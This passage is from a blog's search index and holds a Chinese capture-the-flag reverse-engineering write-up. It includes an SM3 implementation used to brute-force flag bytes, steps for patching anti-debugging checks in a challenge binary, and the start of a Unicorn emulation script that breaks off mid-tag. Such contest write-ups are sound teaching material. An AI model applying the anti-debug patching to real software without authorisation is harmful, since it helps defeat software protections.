<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>网刃杯逆向wp</title>
    <link href="/2021/09/14/%E7%BD%91%E5%88%83%E6%9D%AF%E9%80%86%E5%90%91wp/"/>
    <url>/2021/09/14/%E7%BD%91%E5%88%83%E6%9D%AF%E9%80%86%E5%90%91wp/</url>
    
    <content type="html"><![CDATA[<h1 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h1><p>根据常数搜索到Sm3，然后爆破就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br></pre></td><td class="code"><pre><code class="hljs python">ss = [<span class="hljs-string">&#x27;6b8575c6092240cde08414dafd535bee&#x27;</span>, <span class="hljs-string">&#x27;f0f659f2951290ad5e076b3fe5e70425&#x27;</span>, <span class="hljs-string">&#x27;c1d6c663570de9fad13ddef955d8a02b&#x27;</span>, <span class="hljs-string">&#x27;14c4e442fba6d820ea90ae73ed90ad83&#x27;</span>, <span class="hljs-string">&#x27;25d997669868d0cf89782349256efb33&#x27;</span>, <span class="hljs-string">&#x27;78b1ea6bb1ac10287864c8f52d2758b6&#x27;</span>, <span class="hljs-string">&#x27;67d1259c26765356ddb58c6faf28080c&#x27;</span>, <span class="hljs-string">&#x27;c1e14e0c86f55ba1d74b35b66f96ad36&#x27;</span>, <span class="hljs-string">&#x27;3e4f3ee942d1a57182e24df201b7022b&#x27;</span>, <span class="hljs-string">&#x27;c35557f7e5c389061fb2e2ffa1a644ad&#x27;</span>, <span class="hljs-string">&#x27;15593844fae18fe1a25f3a9017c73810&#x27;</span>, <span class="hljs-string">&#x27;c6c21ca591a63755fd77bf5c55a0238a&#x27;</span>, <span class="hljs-string">&#x27;f90cb529875e83cc191c0e10ead6f73e&#x27;</span>, <span class="hljs-string">&#x27;3ddbe25f9b183c3e2c33c3b1e501fcd8&#x27;</span>, <span class="hljs-string">&#x27;30fdf04c347f1d4e335bda670d54eaaf&#x27;</span>, <span class="hljs-string">&#x27;33feb100c8c7c3769af6e9d26486c646&#x27;</span>]<br>m = <span class="hljs-string">&#x27;77&#x27;</span><br>IV=<span class="hljs-string">&#x27;7380166f4914b2b9172442d7da8a0600a96f30bc163138aae38dee4db0fb0e4e&#x27;</span><br><span class="hljs-comment">#填充函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">filling</span>(<span class="hljs-params">m</span>):</span><br>    <span class="hljs-comment">#消息m是一个16进制字符串</span><br>    <span class="hljs-comment">#直接加16进制比较好</span><br>    <span class="hljs-comment">#61626364616263646162636461626364616263646162636461626364616263646162636461626364616263646162636461626364616263646162636461626364</span><br><br>    <span class="hljs-comment">#a = int(m,16)</span><br>    <span class="hljs-comment">#b = bin(a)[2:]#消息转换为二进制</span><br>    length_b = <span class="hljs-built_in">len</span>(m)*<span class="hljs-number">4</span><span class="hljs-comment">#记录消息的长度</span><br>    <span class="hljs-comment">#s1=&#x27;&#123;:04b&#125;&#x27;.format(s1)</span><br>    b = m<br>    b = b + <span class="hljs-string">&#x27;8&#x27;</span><span class="hljs-comment">#补 1</span><br>    c = <span class="hljs-built_in">len</span>(b)%<span class="hljs-number">128</span><br>    c = <span class="hljs-number">112</span> - c<span class="hljs-comment">#补 0 的个数</span><br>    d = <span class="hljs-string">&#x27;0&#x27;</span>*c<br>    b = b + d<span class="hljs-comment">#补 0</span><br>    length_m = <span class="hljs-string">&#x27;&#123;:016x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(length_b)<span class="hljs-comment">#也是16进制</span><br>    b = b + length_m<span class="hljs-comment">#填充完毕</span><br>    <span class="hljs-comment">#b = int(b)</span><br>    <span class="hljs-comment">#b = hex(b)[2:]</span><br>    <span class="hljs-keyword">return</span> b<br><br><span class="hljs-comment">#分组函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fenzu</span>(<span class="hljs-params">m</span>):</span><br>    m = filling(m)<br>    len_m = <span class="hljs-built_in">len</span>(m)/<span class="hljs-number">128</span><br>    m_list = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(len_m)):<br>        a = m[<span class="hljs-number">0</span>+<span class="hljs-number">128</span>*i:+<span class="hljs-number">128</span>*(i+<span class="hljs-number">1</span>)]<br>        m_list.append(a)<br>    <span class="hljs-keyword">return</span> m_list<br><br><span class="hljs-comment">#扩展函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">expand</span>(<span class="hljs-params">m,n</span>):</span><span class="hljs-comment">#n代表是第几组消息，消息之间没有关系，不用迭代</span><br>    B = fenzu(m)<span class="hljs-comment">#列表</span><br>    W = [<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">68</span>)]<br>    W_0 = [<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(B[n])/<span class="hljs-number">8</span>)):<span class="hljs-comment">#128/8=16个字</span><br>        w = B[n][i*<span class="hljs-number">8</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>]<br>        W[i] = w<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>,<span class="hljs-number">68</span>):<br>        a = or_16(W[j-<span class="hljs-number">16</span>],W[j-<span class="hljs-number">9</span>])<br><br>        W_j_3 = Cyc_shift(W[j-<span class="hljs-number">3</span>],<span class="hljs-number">15</span>)<br>        <span class="hljs-comment">#print(W_j_3)</span><br>        a = or_16(a,W_j_3)<br><br>        a = Replace_P1(a)<br>        <span class="hljs-comment">#print(a)</span><br>        W_j_13=Cyc_shift(W[j-<span class="hljs-number">13</span>],<span class="hljs-number">7</span>)<br>        a = or_16(a,W_j_13)<br>        a = or_16(a,W[j-<span class="hljs-number">6</span>])<br>        W[j]=a<br>    <span class="hljs-comment">#return W</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        W_0[j]=or_16(W[j],W[j+<span class="hljs-number">4</span>])<br>    <span class="hljs-keyword">return</span> W,W_0<br><br><span class="hljs-comment">#置换函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Replace_P1</span>(<span class="hljs-params">X</span>):</span><br>    <span class="hljs-comment">#X为32位字</span><br>    X_15 = Cyc_shift(X,<span class="hljs-number">15</span>)  <span class="hljs-comment">#循环移位</span><br>    X_23 = Cyc_shift(X,<span class="hljs-number">23</span>)<br>    a = or_16(X,X_15)<br>    a = or_16(a,X_23)<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-comment">#置换函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Replace_P0</span>(<span class="hljs-params">X</span>):</span><br>    <span class="hljs-comment">#X为32位字</span><br>    X_9 = Cyc_shift(X,<span class="hljs-number">9</span>)<br>    X_17 = Cyc_shift(X,<span class="hljs-number">17</span>)<br>    a = or_16(X,X_9)<br>    a = or_16(a,X_17)<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-comment">#异或函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">or_16</span>(<span class="hljs-params">A,B</span>):</span><br>    A = <span class="hljs-built_in">int</span>(A,<span class="hljs-number">16</span>)<br>    B = <span class="hljs-built_in">int</span>(B,<span class="hljs-number">16</span>)<br>    C = A ^ B<br>    C = <span class="hljs-string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(C)<br>    <span class="hljs-keyword">return</span> C<br><br><span class="hljs-comment">#循环移位函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Cyc_shift</span>(<span class="hljs-params">W,n</span>):</span><br>    a = <span class="hljs-built_in">int</span>(W,<span class="hljs-number">16</span>)<br>    a = <span class="hljs-string">&#x27;&#123;:032b&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(a)<br>    <span class="hljs-keyword">while</span> n&gt;=<span class="hljs-number">32</span>:<br>        n=n-<span class="hljs-number">32</span><br>    a = a[n:] + a[:n]<br>    a = <span class="hljs-built_in">int</span>(a,<span class="hljs-number">2</span>)<br>    a = <span class="hljs-string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(a)<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-comment">#常量Tj</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">T_j</span>(<span class="hljs-params">j</span>):</span><br>    <span class="hljs-keyword">if</span> j&lt;=<span class="hljs-number">15</span>:<br>        T_j=<span class="hljs-string">&#x27;79cc4519&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        T_j=<span class="hljs-string">&#x27;7a879d8a&#x27;</span><br>    <span class="hljs-keyword">return</span> T_j<br><br><span class="hljs-comment">#mod 2^32 算术加运算</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">x,y</span>):</span><br>    x = <span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>)<br>    x = <span class="hljs-string">&#x27;&#123;:032b&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(x)<br>    x = <span class="hljs-built_in">list</span>(x)<br>    y = <span class="hljs-built_in">int</span>(y, <span class="hljs-number">16</span>)<br>    y = <span class="hljs-string">&#x27;&#123;:032b&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(y)<br>    y = <span class="hljs-built_in">list</span>(y)<br>    <span class="hljs-comment">#print(x)</span><br>    <span class="hljs-comment">#print(y)</span><br>    a = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]<br>    carry = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        m = <span class="hljs-built_in">int</span>(x[<span class="hljs-number">31</span>-i])+<span class="hljs-built_in">int</span>(y[<span class="hljs-number">31</span>-i])+carry<br>        <span class="hljs-keyword">if</span> m&gt;=<span class="hljs-number">2</span>:<br>            d=m-<span class="hljs-number">2</span><br>            a[<span class="hljs-number">31</span>-i]=<span class="hljs-built_in">str</span>(d)<br>            carry=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            carry=<span class="hljs-number">0</span><br>            d=m<br>            a[<span class="hljs-number">31</span> - i] = <span class="hljs-built_in">str</span>(d)<br>    <span class="hljs-comment">#print(a)</span><br>    b=<span class="hljs-string">&#x27;&#x27;</span>.join(a)<br>    b=<span class="hljs-built_in">int</span>(b,<span class="hljs-number">2</span>)<br>    b=<span class="hljs-string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(b)<br>    <span class="hljs-keyword">return</span> b<br><br><span class="hljs-comment">#布尔函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">FF_j</span>(<span class="hljs-params">X,Y,Z,j</span>):</span><br>    <span class="hljs-keyword">if</span> j&lt;=<span class="hljs-number">15</span>:<br>        a = or_16(X,Y)<br>        a = or_16(a,Z)<br>    <span class="hljs-keyword">else</span>:<br>        a = and_Cal(X,Y)<br>        b = and_Cal(X,Z)<br>        c = and_Cal(Y,Z)<br>        a = or_Cal(a,b)<br>        a = or_Cal(a,c)<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-comment">#布尔函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GG_j</span>(<span class="hljs-params">X, Y, Z, j</span>):</span><br>    <span class="hljs-keyword">if</span> j &lt;= <span class="hljs-number">15</span>:<br>        a = or_16(X, Y)<br>        a = or_16(a, Z)<br>    <span class="hljs-keyword">else</span>:<br>        a = and_Cal(X,Y)<br>        b = qufan(X)<br>        b = and_Cal(b,Z)<br>        a = or_Cal(a,b)<br>    <span class="hljs-keyword">return</span> a<br><br><span class="hljs-comment">#与运算函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">and_Cal</span>(<span class="hljs-params">a,b</span>):</span><br>    a = <span class="hljs-built_in">int</span>(a,<span class="hljs-number">16</span>)<br>    b = <span class="hljs-built_in">int</span>(b,<span class="hljs-number">16</span>)<br>    a_b = a &amp; b<br>    a_b = <span class="hljs-string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(a_b)<br>    <span class="hljs-keyword">return</span> a_b<br><br><span class="hljs-comment">#或运算函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">or_Cal</span>(<span class="hljs-params">a,b</span>):</span><br>    a = <span class="hljs-built_in">int</span>(a, <span class="hljs-number">16</span>)<br>    b = <span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>)<br>    a_b = a | b<br>    a_b = <span class="hljs-string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(a_b)<br>    <span class="hljs-keyword">return</span> a_b<br><br><span class="hljs-comment">#按位取反函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">qufan</span>(<span class="hljs-params">A</span>):</span><br>    A = <span class="hljs-built_in">int</span>(A,<span class="hljs-number">16</span>)<br>    A = <span class="hljs-string">&#x27;&#123;:032b&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(A)<br>    A = <span class="hljs-built_in">list</span>(A)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        <span class="hljs-keyword">if</span> A[i]==<span class="hljs-string">&#x27;0&#x27;</span>:<br>            A[i]=<span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            A[i]=<span class="hljs-string">&#x27;0&#x27;</span><br>    A = <span class="hljs-string">&#x27;&#x27;</span>.join(A)<br>    A = <span class="hljs-built_in">int</span>(A,<span class="hljs-number">2</span>)<br>    A = <span class="hljs-string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(A)<br>    <span class="hljs-keyword">return</span> A<br><br><span class="hljs-comment">#压缩函数</span><br>m_list = fenzu(m)<br>m_len = <span class="hljs-built_in">len</span>(m_list)<br>V = [<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m_len+<span class="hljs-number">1</span>)]<br>V[<span class="hljs-number">0</span>]=IV<br><br><span class="hljs-comment">#压缩函数</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CF</span>(<span class="hljs-params">m,n,k</span>):</span><br>    w = expand(m, n)<br>    W = w[<span class="hljs-number">0</span>]<br>    W_0 = w[<span class="hljs-number">1</span>]<br>    A=V[k][<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]<br>    B=V[k][<span class="hljs-number">8</span>:<span class="hljs-number">16</span>]<br>    C=V[k][<span class="hljs-number">16</span>:<span class="hljs-number">24</span>]<br>    D=V[k][<span class="hljs-number">24</span>:<span class="hljs-number">32</span>]<br>    E=V[k][<span class="hljs-number">32</span>:<span class="hljs-number">40</span>]<br>    F=V[k][<span class="hljs-number">40</span>:<span class="hljs-number">48</span>]<br>    G=V[k][<span class="hljs-number">48</span>:<span class="hljs-number">56</span>]<br>    H=V[k][<span class="hljs-number">56</span>:<span class="hljs-number">64</span>]<br>    <span class="hljs-comment">#print(W_0)</span><br>    <span class="hljs-built_in">all</span>=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        <span class="hljs-comment">#print(E)</span><br>        b= a = Cyc_shift(A,<span class="hljs-number">12</span>)<br>        <span class="hljs-comment">#t = b</span><br>        T = T_j(j)<br>        <span class="hljs-comment">#</span><br>        T = Cyc_shift(T,j)<span class="hljs-comment">#忘记移位了，移位问题</span><br>        a = add(a,E)<br>        a = add(a,T)<br>        SS1 = Cyc_shift(a,<span class="hljs-number">7</span>)<br>        SS2 = or_16(SS1,b)<br>        b = FF_j(A,B,C,j)<br>        b = add(b,D)<br>        b = add(b,SS2)<br>        TT1 = add(b,W_0[j]) <span class="hljs-comment">#</span><br>        b = GG_j(E,F,G,j)<br>        b = add(b, H)<br>        b = add(b, SS1)<br>        TT2 = add(b, W[j]) <span class="hljs-comment">#</span><br>        D = C<br>        C = Cyc_shift(B,<span class="hljs-number">9</span>)<br>        B = A<br>        A = TT1<span class="hljs-comment">#</span><br>        H = G<br>        G = Cyc_shift(F,<span class="hljs-number">19</span>)<br>        F = E<br>        E = Replace_P0(TT2) <span class="hljs-comment">#</span><br>        <span class="hljs-built_in">all</span> = A+B+C+D+E+F+G+H<br>        <span class="hljs-comment">#print(all)</span><br>    <span class="hljs-comment">#V[k+1]=or_16(all,V[k])</span><br>    <span class="hljs-comment">#return V[k+1]</span><br>    <span class="hljs-comment">#print(t)</span><br>    <span class="hljs-comment">#return all</span><br>    V[k+<span class="hljs-number">1</span>]=or_16(V[k],<span class="hljs-built_in">all</span>)<br><br><span class="hljs-comment">#print(CF(m,0,0))</span><br><span class="hljs-comment">#print(V)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hash</span>(<span class="hljs-params">m=m</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m_len):<br>        v_n=CF(m,i,i)<br>    <span class="hljs-comment">#print(V[-1])</span><br>    <span class="hljs-keyword">return</span> V[-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment">#b=&#x27;&#x27;</span><br><span class="hljs-comment">#b=a[0:8]+&#x27;\0&#x27;+a[8:16]+&#x27;\0&#x27;+a[16:24]+&#x27;\0&#x27;+a[24:32]+&#x27;\0&#x27;+a[32:40]+&#x27;\0&#x27;+a[40:48]+&#x27;\0&#x27;+a[48:56]+&#x27;\0&#x27;+a[56:64]</span><br><span class="hljs-comment">#print(b)</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>ttt = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ss)):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xff</span>):<br>        arg = ttt + <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>        res = <span class="hljs-built_in">hash</span>(m=arg)[:<span class="hljs-number">32</span>]<br>        <span class="hljs-comment">#print(res, i)</span><br>        <span class="hljs-keyword">if</span> res == ss[j]:<br>            flag += <span class="hljs-built_in">chr</span>(i)<br>            ttt += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;0&quot;</span>)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#print(&#x27;输入的消息m是:\n&#x27;,m)</span><br><span class="hljs-comment">#print(&#x27;消息m的hash值为:\n&#x27;,b)</span><br></code></pre></td></tr></table></figure><h1 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h1><p>本来用unicorn可以秒这道题，但是不知道我多蠢，模拟了一个自己patch过的文件，导致没跑出来，解出这个题之后才发觉，所以写两种方法。</p><p>两个地方反调试：</p><p><img src="/2021/09/14/%E7%BD%91%E5%88%83%E6%9D%AF%E9%80%86%E5%90%91wp/image-20210914154437831-1605479.png" alt="image-20210914154437831"></p><p><img src="/2021/09/14/%E7%BD%91%E5%88%83%E6%9D%AF%E9%80%86%E5%90%91wp/image-20210914154457751.png" alt="image-20210914154457751"></p><p>这里也需要过跳转：</p><p><img src="/2021/09/14/%E7%BD%91%E5%88%83%E6%9D%AF%E9%80%86%E5%90%91wp/image-20210914154656377.png" alt="image-20210914154656377"></p><p>关键地方就是check分数，得到正确的分数进行简单计算即可：</p><p><img src="/2021/09/14/%E7%BD%91%E5%88%83%E6%9D%AF%E9%80%86%E5%90%91wp/image-20210914154758503.png" alt="image-20210914154758503"></p><p>要得到score，patch反调试，然后程序内改汇编进行爆破。</p><p>.text:00992388 90                      nop<br>.text:00992389<br>.text:00992389                         loc_992389:                             ; CODE XREF: sub_992290+12C↓j<br>.text:00992389 8B 8D 68 FF FF FF       mov     ecx, [ebp+var_98]<br>.text:0099238F 8B 01                   mov     eax, [ecx+0]<br>.text:00992391 83 C0 01                add     eax, 1<br>.text:00992394 89 01                   mov     [ecx], eax<br>.text:00992396 89 41 4C                mov     [ecx+4Ch], eax<br>.text:00992399 90                      nop<br>.text:0099239A 90                      nop<br>.text:0099239B 90                      nop<br>.text:0099239C 90                      nop</p><p>拿到分数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">v12 = <span class="hljs-number">0x2100</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>a1 = <span class="hljs-number">0x2100</span> ^ <span class="hljs-number">0xAC0B</span><br><br><span class="hljs-keyword">while</span>(v12):<br>    v9 = v12 % <span class="hljs-number">8</span> + <span class="hljs-number">48</span><br>    flag += <span class="hljs-built_in">chr</span>(v9)<br>    v12 //= <span class="hljs-number">8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&#123;&quot;</span> + <span class="hljs-string">&quot;b0d8&quot;</span> + flag + <span class="hljs-string">&quot;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>unicorn模拟程序爆破解法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code 